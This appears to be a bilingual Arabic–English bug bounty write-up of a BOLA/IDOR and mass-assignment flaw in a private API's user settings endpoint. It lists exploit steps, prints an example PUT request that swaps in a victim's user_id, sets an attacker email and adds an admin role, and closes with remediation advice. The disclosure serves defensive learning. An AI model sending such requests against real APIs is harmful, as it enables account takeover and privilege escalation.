API Hacking: Broken Object Level Authorization (BOLA)

HIGH Bounty: $2,500

Overview / نظرة عامة

AR

تتعامل تطبيقات الويب مع الخدمات الخلفية عبر واجهات برمجة التطبيقات (APIs). يوضح هذا التقرير كيفية اكتشاف واستغلال ثغرة BOLA / IDOR لتسريب وتعديل بيانات مستخدمين آخرين والحصول على صلاحيات إدارية كاملة.

EN

Web apps communicate with backends via REST/JSON APIs. This writeup documents how a Broken Object Level Authorization (BOLA) bug was discovered in a private API endpoint, letting users modify administrative settings.

Exploit Chain / خطوات الاستغلال

  1. تحليل وتتبع اتصالات الموقع عبر Burp Suite واكتشاف طلب PUT /api/v2/user/settings.
  2. التلاعب بقيم الجسم الممررة في الطلب وتبديل {"user_id": 4020} بمعرف الضحية {"user_id": 1002}.
  3. لاحظ أن السيرفر يقبل التعديلات ويقوم بتطبيقها بنجاح دون التحقق من هوية مرسل الطلب.
  4. إضافة حقول غير معلنة في الطلب (Mass Assignment) مثل "role": "admin" لترقية الحساب وحقنه بنجاح.

Example Request / نموذج الطلب

API Mass Assignment Exploit Request / طلب استغلال واجهة API 
PUT /api/v2/user/settings HTTP/1.1
Host: target-api.com
Authorization: Bearer guest_token
Content-Type: application/json

{
  "user_id": 1002,
  "email": "hacker@evil.com",
  "role": "admin"
}

Remediation / التخفيف والحماية

AR

قم بالتحقق دائماً من الصلاحيات والتحكم بالوصول في البيئة الخلفية لكل طلب، وقارن معرّف الجلسة (Session ID) بالمعرّف الممرر في المتغيرات قبل الحفظ.

EN

Ensure that the backend enforces authorization checks for every incoming request by validating that the session owner matches the resource identifier being edited.
